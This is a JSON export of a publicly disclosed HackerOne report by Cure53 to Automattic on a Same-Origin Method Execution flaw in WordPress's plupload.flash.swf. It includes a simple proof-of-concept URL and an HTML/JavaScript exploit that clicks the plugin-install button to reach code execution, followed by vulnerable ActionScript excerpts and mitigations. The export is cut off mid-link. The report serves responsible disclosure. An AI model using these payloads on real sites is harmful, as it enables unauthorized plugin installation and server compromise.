{"id":134738,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQ3Mzg=","url":"https://hackerone.com/reports/134738","title":"WordPress SOME bug in plupload.flash.swf leading to RCE","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-26T09:53:11.012Z","submitted_at":"2016-04-26T09:53:11.012Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cure53","url":"/cure53","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/072/123/1c801729a8988a0b6873c3d9ccf131e2a1488011_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-07-10T12:50:19.487Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-06-10T12:50:14.410Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Intro\n==\n\nWordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file *plupload.flash.swf*. The code in the file attempts to remove *flashVars* [¹](https://helpx.adobe.com/flash/kb/pass-variables-swfs-flashvars.html) in case they have been set GET parameters but fails to do so, enabling XSS via *ExternalInterface* [²](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html).\n\nThe attack technique was first described by Soroush Dalili in 2013 [³](https://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-bypassing-the-guardians-part-1/). The vulnerability in *plupload.flash.swf* was discovered in April 2016, first identified as SOME[⁴](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html) bug by Kinugawa. Then, after a team review, the XSS potential was discovered and analyzed by Heiderich, Kinugawa and Inführ. Finally, it was discovered, that this file comes packaged with latest WordPress and the issue was reported here by Heiderich et al.\n\n**Simple PoC:**\nhttp://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026uid%g=hello\u0026\n\nA more complex PoC was created to demonstrate the potential Remote Code Execution attack (RCE) of this vulnerability. A detailed description thereof can be found below.\n\n```html\n\u003cbutton onclick=\"fire()\"\u003eClick\u003c/button\u003e\n\u003cscript\u003e\nfunction fire() {\n open('javascript:setTimeout(\"location=\\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click\u0026uid%g=hello\u0026\\'\", 2000)');\n  setTimeout('location=\"http://example.com/wp-admin/plugin-install.php?tab=plugin-information\u0026plugin=wp-super-cache\u0026TB_iframe=true\u0026width=600\u0026height=550\"')\n}\n\u003c/script\u003e\n```\n\nBackground\n==\n\nThe majority of background information as to why this kind of attack works and how the protective mechanisms installed in the SWF can be bypassed was already explained in depth in this bug report:\n\nhttps://hackerone.com/bugs?subject=user\u0026report_id=134546\n\nThis section will therefore describe the SOME bug in more detail and omit the basics on why the attack works as they are identical to the ones in the other ticket. Now, let's get specific with this bug's details.\n\nSimilar to the affected file in the linked report, Plupload employs the so called “GET Killer”:\n\n```actionscript\nparams = root.loaderInfo.parameters;\npos = root.loaderInfo.url.indexOf('?');\nif (pos !== -1) {\n    query = Utils.parseStr(root.loaderInfo.url.substr(pos + 1));        \n    \n    for (var key:String in params) {    \n        if (query.hasOwnProperty(Utils.trim(key))) {\n            delete params[key];\n        }\n    }\n}\n```\n\nFrom: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70\n\nThe string parsing is done in a different ActionScript file:\n\n```actionscript\nstatic public function parseStr (str:String) : Object {\n    var hash:Object = {},\n        arr1:Array, arr2:Array;\n    \n    str = unescape(str).replace(/\\+/g, \" \");\n    \n    arr1 = str.split('\u0026');\n    if (!arr1.length) {\n        return {};\n    }\n    \n    for (var i:uint = 0, length:uint = arr1.length; i \u003c length; i++) {\n        arr2 = arr1[i].split('=');\n        if (!arr2.length) {\n            continue;\n        }\n        hash[Utils.trim(arr2[0])] = Utils.trim(arr2[1]);\n    }\n    return hash;\n}\n```\n\nFrom: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102\n\nThe sanitization in this file is done quite well and strict enough to prohibit XSS attacks. An attacker can however select a different type of attack, also known as SOME or Reverse Clickjacking.\n\nThe affected code can be found here:\n\n```actionscript\nprivate function _fireEvent(evt:*, obj:* = null):void {\n    try {\n        ExternalInterface.call(eventDispatcher, evt, obj);\n    } catch(err:*) {\n        //_fireEvent(\"Exception\", { name: 'RuntimeError', message: 4 });\n        \n        // throwing an exception would be better here\n    }\n}\n```\n\nThe method is being called from within the `_init()` method and receives an event and an optional object. The actual event dispatcher is stored as an object member at a different place in the code.\n\n**Calling _fireEvent:**\n```actionscript\nMoxie.uid = Utils.sanitize(params[\"uid\"]);    \n\n[...]\n\n_fireEvent(Moxie.uid + \"::Init\");    \n```\n\n\n**Setting the event dispatcher:**\n```actionscript\n// Event dispatcher\nif (params.hasOwnProperty(\"target\") \u0026\u0026 /^[\\w\\.]+$/.test(params[\"target\"])) {\n    eventDispatcher = params[\"target\"];\n}\n```\n\nThe sanitation for both the event dispatcher and the event string is quite tough and only allows word characters in one case, and word characters and the dot in the other case:\n\n```actionscript\nif (params.hasOwnProperty(\"target\") \u0026\u0026 /^[\\w\\.]+$/.test(params[\"target\"])) {\n\n```\n\n```actionscript\nstatic public function sanitize(str:String) : String\n{\n    // allow only [a-zA-Z0-9_]\n    return str.replace(/[^\\w]/g, '');\n}\n[...]\nMoxie.uid = Utils.sanitize(params[\"uid\"]);\n\n```\n\nDespite the strong validation, the attacker can still cause damage - tremendous damage too. This is done by executing a SOME attack. This kind of attack allows to generate certain types of events by abusing the callback.\n\nAn attacker can for example click a button on the same domain as the Flash file by instructing the Flash file, not to execute a pre-defined callback but rather by making use of certain DOM properties that give more or less direct access to the button and then by executing a `click()` method. Let’s have a look at a trivial example first and imagine *victim.com* that hosts both the Plupload SWF and some logic, where a click on a button will, let’s say, delete a user:\n\n* Attacker crafts a specific payload\n* Attacker then lures logged in victim to a website \n* The website will do the following steps \n* Open the Plupload SWF in a new tab\n* Have the SWF use the target parameter `opener.document.body.firstElementChild.firstElementChild.click`\n* While the SWF still loads, the `opener` location changes\n* It navigates to *victim.com/admin*\n* Now, SWF and page are on the same domain\n* SWF is now allows to perform clicks on opener. The button will be clicked\n\nDone, that is the whole attack in simple. Open SWF in a new window, define a callback that traverses to an important element and clicks it, navigate the opener to the page containing the element, have the click happen.\n\nNow, the following more specific PoC describes the attack against WordPress and shows, how we can turn the SOME into an RCE!\n\n1. An attacker sends a link that contains the exploit to an authenticated user\n2. The user (victim) opens the link and clicks the button\n3. The exploit opens a new window to the SWF file, meanwhile the other window is loading the plugin page\n5. The exploit then triggers the install button of a malicious plugin\n6. The plugin is installed and the malicious codes are uploaded on the server accordingly\n\n```html\n\u003cbutton onclick=\"fire()\"\u003eClick\u003c/button\u003e\n\u003cscript\u003e\nfunction fire() {\n open('javascript:setTimeout(\"location=\\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click\u0026uid%g=hello\u0026\\'\", 2000)');\n  setTimeout('location=\"http://example.com/wp-admin/plugin-install.php?tab=plugin-information\u0026plugin=wp-super-cache\u0026TB_iframe=true\u0026width=600\u0026height=550\"')\n}\n\u003c/script\u003e\n```\n\nAffected Systems\n==\n\nAll WordPress instances that allow to directly call this file. That should be the absolute majority. Google finds a couple of them but we assume it is actually significantly more[⁹](https://www.google.com/search?q=inurl:/wp-includes/js/plupload/plupload.flash.swf+ext:swf\u0026channel=fs\u0026start=10).\n\nHere is some numbers that other people guesstimate:\n * https://managewp.com/14-surprising-statistics-about-wordpress-usage\n * https://www.quora.com/How-many-websites-are-built-on-Wordpress\n * https://wordpress.com/activity/\n\nFurther note, browser-based XSS filters will not detect the attack and hence not protect here.\n\nMitigation\n==\n\n* Prevent direct access to all Flash files in the WordPress folder (`Content-Disposition` headers might help)\n* Configure your WAF to block direct access to this file\n* Wait for the fix and update Wordpress\n\nCredits\n==\n\nCredits for this find go to Soroush Dalili for initially documenting the attack technique that helped bypassing “The GET Killer”.\n\nFurther credits go to Kinugawa, Filedescriptor and Heiderich of Cure53 for discovering the bug in WordPress default installations and developing an attack scenario leading to RCE by using SOME to install rogue WordPress Plugins.\n","vulnerability_information_html":"\u003ch1 id=\"intro\"\u003eIntro\u003c/h1\u003e\n\n\u003cp\u003eWordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file \u003cem\u003eplupload.flash.swf\u003c/em\u003e. The code in the file attempts to remove \u003cem\u003eflashVars\u003c/em\u003e \u003ca href=\"/redirect?url=https%3A%2F%2Fhelpx.adobe.com%2Fflash%2Fkb%2Fpass-variables-swfs-flashvars.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e¹\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in case they have been set GET parameters but fails to do so, enabling XSS via \u003cem\u003eExternalInterface\u003c/em\u003e \u003ca href=\"/redirect?url=http%3A%2F%2Fhelp.adobe.com%2Fen_US%2FFlashPlatform%2Freference%2Factionscript%2F3%2Fflash%2Fexternal%2FExternalInterface.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e²\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe attack technique was first described by Soroush Dalili in 2013 \u003ca href=\"/redirect?url=https%3A%2F%2Fsoroush.secproject.com%2Fblog%2F2013%2F10%2Fcatch-up-on-flash-xss-exploitation-bypassing-the-guardians-part-1%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e³\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The vulnerability in \u003cem\u003eplupload.flash.swf\u003c/em\u003e was discovered in April 2016, first identified as SOME\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.benhayak.com%2F2015%2F06%2Fsame-origin-method-execution-some.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e⁴\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e bug by Kinugawa. Then, after a team review, the XSS potential was discovered and analyzed by Heiderich, Kinugawa and Inführ. Finally, it was discovered, that this file comes packaged with latest WordPress and the issue was reported here by Heiderich et al.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSimple PoC:\u003c/strong\u003e\u003cbr\u003e\n\u003ca title=\"http://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026amp;uid%g=hello\u0026amp;\" href=\"/redirect?url=http%3A%2F%2Fexample.com%2F%2Fwp-includes%2Fjs%2Fplupload%2Fplupload.flash.swf%3F%25%23target%25g%3Dalert%26uid%25g%3Dhello%26\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026amp;uid%g=hello\u0026amp;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eA more complex PoC was created to demonstrate the potential Remote Code Execution attack (RCE) of this vulnerability. A detailed description thereof can be found below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eonclick=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;fire()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eClick\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003efire\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n \u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ejavascript:setTimeout(\u0026quot;location=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click\u0026amp;uid%g=hello\u0026amp;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;, 2000)\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003elocation=\u0026quot;http://example.com/wp-admin/plugin-install.php?tab=plugin-information\u0026amp;plugin=wp-super-cache\u0026amp;TB_iframe=true\u0026amp;width=600\u0026amp;height=550\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"background\"\u003eBackground\u003c/h1\u003e\n\n\u003cp\u003eThe majority of background information as to why this kind of attack works and how the protective mechanisms installed in the SWF can be bypassed was already explained in depth in this bug report:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://hackerone.com/bugs?subject=user\u0026amp;report_id=134546\" href=\"https://hackerone.com/bugs?subject=user\u0026amp;report_id=134546\"\u003ehttps://hackerone.com/bugs?subject=user\u0026amp;report_id=134546\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis section will therefore describe the SOME bug in more detail and omit the basics on why the attack works as they are identical to the ones in the other ticket. Now, let\u0026#39;s get specific with this bug\u0026#39;s details.\u003c/p\u003e\n\n\u003cp\u003eSimilar to the affected file in the linked report, Plupload employs the so called “GET Killer”:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight actionscript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eroot\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eloaderInfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparameters\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003epos\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eroot\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eloaderInfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eindexOf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epos\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"mi\"\u003e-1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003equery\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparseStr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eroot\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eloaderInfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esubstr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epos\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e        \n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003eString\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003equery\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etrim\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003edelete\u003c/span\u003e \u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFrom: \u003ca title=\"https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmoxiecode%2Fmoxie%2Fblob%2Fd91c63758c1d372a38615e8b966b50545faa70ca%2Fsrc%2Fflash%2Fsrc%2FMoxie.as%23L70\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe string parsing is done in a different ActionScript file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight actionscript\"\u003e\u003ccode\u003e\u003cspan class=\"kr\"\u003estatic\u003c/span\u003e \u003cspan class=\"kr\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eparseStr\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003eString\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eObject\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nb\"\u003eObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{},\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003earr1\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003earr2\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003eArray\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eunescape\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\+\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot; \u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003earr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026amp;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003earr1\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003euint\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003euint\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003earr1\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003earr2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003earr1\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;=\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003earr2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003econtinue\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etrim\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003earr2\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e])]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etrim\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003earr2\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFrom: 